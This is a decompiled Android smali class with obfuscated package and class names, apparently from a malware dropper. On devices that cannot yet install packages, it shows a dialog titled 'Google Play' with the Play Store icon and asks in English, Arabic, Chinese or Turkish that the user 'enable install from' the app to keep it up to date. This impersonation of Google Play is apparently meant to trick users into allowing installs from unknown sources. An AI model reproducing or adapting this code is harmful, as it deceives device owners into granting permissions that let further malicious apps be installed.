.class public Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;
.super Landroid/app/Activity;
.source "sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll.java"


# static fields
.field private static final REQUEST_INSTALL_PERMISSION:I = 0x3e9


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 20
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private Askinstall()V
    .locals 10

    .line 36
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v0

    .line 38
    new-instance v1, Landroid/app/AlertDialog$Builder;

    invoke-direct {v1, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x0

    const/4 v3, 0x3

    .line 45
    :try_start_0
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;->getPackageName()Ljava/lang/String;

    move-result-object v4

    .line 46
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    .line 48
    invoke-virtual {v5, v4, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v4

    if-eqz v4, :cond_0

    .line 49
    invoke-virtual {v5, v4}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v4

    goto :goto_0

    :cond_0
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->cmn:[Ljava/lang/String;

    aget-object v4, v4, v3

    :goto_0
    check-cast v4, Ljava/lang/String;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    const-string v4, ""

    :goto_1
    const/4 v5, -0x1

    .line 54
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v6

    const/16 v7, 0xc31

    const/4 v8, 0x2

    const/4 v9, 0x1

    if-eq v6, v7, :cond_4

    const/16 v7, 0xca9

    if-eq v6, v7, :cond_3

    const/16 v2, 0xe7e

    if-eq v6, v2, :cond_2

    const/16 v2, 0xf2e

    if-eq v6, v2, :cond_1

    goto :goto_2

    :cond_1
    const-string v2, "zh"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    const/4 v2, 0x2

    goto :goto_3

    :cond_2
    const-string v2, "tr"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    const/4 v2, 0x3

    goto :goto_3

    :cond_3
    const-string v6, "en"

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    goto :goto_3

    :cond_4
    const-string v2, "ar"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    const/4 v2, 0x1

    goto :goto_3

    :cond_5
    :goto_2
    const/4 v2, -0x1

    :goto_3
    if-eqz v2, :cond_9

    if-eq v2, v9, :cond_8

    if-eq v2, v8, :cond_7

    if-eq v2, v3, :cond_6

    .line 78
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "to keep the app up-to date , please enable install from: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v0, "OK"

    goto :goto_4

    .line 73
    :cond_6
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Uygulamay\u0131 g\u00fcncel tutmak i\u00e7in \u015euradan Y\u00fckle\'yi etkinle\u015ftirin: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v0, "Tamam"

    goto :goto_4

    .line 68
    :cond_7
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u4e3a\u4e86\u4f7f\u5e94\u7528\u7a0b\u5e8f\u4fdd\u6301\u6700\u65b0\u72b6\u6001\uff0c\u8bf7\u542f\u7528\u4ece\u4ee5\u4e0b\u4f4d\u7f6e\u5b89\u88c5\uff1a"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v0, "\u4f7f\u80fd\u591f"

    goto :goto_4

    .line 63
    :cond_8
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u0644\u0644\u062d\u0641\u0627\u0638 \u0639\u0644\u0649 \u0627\u0644\u062a\u0637\u0628\u064a\u0642 \u0645\u062d\u062f\u062b\u064b\u0627 \u060c \u064a\u0631\u062c\u0649 \u062a\u0645\u0643\u064a\u0646 \u0627\u0644\u062a\u062b\u0628\u064a\u062a \u0645\u0646: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v0, "\u062a\u0641\u0639\u064a\u0644"

    goto :goto_4

    .line 58
    :cond_9
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "To keep the app up-to date , please enable install from: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v0, "Enable"

    .line 83
    :goto_4
    :try_start_1
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const-string v3, "com.android.vending"

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    .line 84
    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    const-string v2, "Google Play"

    .line 85
    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_5

    .line 90
    :catch_1
    :try_start_2
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    .line 91
    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    .line 92
    invoke-virtual {v1, v4}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_2
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_2 .. :try_end_2} :catch_2

    .line 100
    :catch_2
    :goto_5
    new-instance v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll$1;

    invoke-direct {v2, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll$1;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;)V

    invoke-virtual {v1, v0, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 116
    invoke-virtual {v1}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 1

    .line 122
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->MyAccess:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;

    if-eqz v0, :cond_0

    .line 123
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->MyAccess:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;

    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;->FOR_INST:Ljava/lang/Boolean;

    .line 125
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    .line 130
    sget-object p3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->MyAccess:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;

    if-eqz p3, :cond_0

    .line 131
    sget-object p3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->MyAccess:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;

    const/4 p3, 0x0

    invoke-static {p3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p3

    sput-object p3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;->FOR_INST:Ljava/lang/Boolean;

    :cond_0
    const/16 p3, 0x3e9

    if-ne p1, p3, :cond_2

    const/4 p1, -0x1

    if-ne p2, p1, :cond_1

    .line 136
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;->finish()V

    goto :goto_0

    .line 139
    :cond_1
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;->finish()V

    :cond_2
    :goto_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1

    .line 25
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 27
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x1a

    if-lt p1, v0, :cond_0

    .line 29
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/pm/PackageManager;->canRequestPackageInstalls()Z

    move-result p1

    if-nez p1, :cond_0

    .line 31
    invoke-direct {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/sjevviygrgznjcusmuosvyaisccxgmnbuojtfdzvvpwdawdurd20instll;->Askinstall()V

    :cond_0
    return-void
.end method
